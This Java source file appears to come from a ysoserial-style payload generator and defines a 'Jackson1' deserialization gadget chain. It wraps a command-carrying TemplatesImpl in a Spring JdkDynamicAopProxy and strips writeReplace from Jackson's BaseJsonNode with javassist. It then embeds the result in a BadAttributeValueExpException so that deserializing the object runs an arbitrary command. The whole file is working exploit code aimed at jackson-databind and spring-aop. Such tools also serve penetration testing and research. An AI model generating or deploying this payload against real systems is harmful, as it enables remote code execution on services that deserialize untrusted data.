package com.h2tg.ysogate.payloads.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

@SuppressWarnings({"rawtypes"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2", "org.springframework:spring-aop:4.1.4.RELEASE"})
public class Jackson1 implements CommandObjectPayload<Object>
{
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson1.class, args);
    }

    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        // use JdkDynamicAopProxy to make jackson better.
        // read this https://xz.aliyun.com/t/12846
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    public Object getObject(final String command) throws Exception {
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        try {
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception e) {
            // ignore
        }
        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", node);
        return val;
    }
}
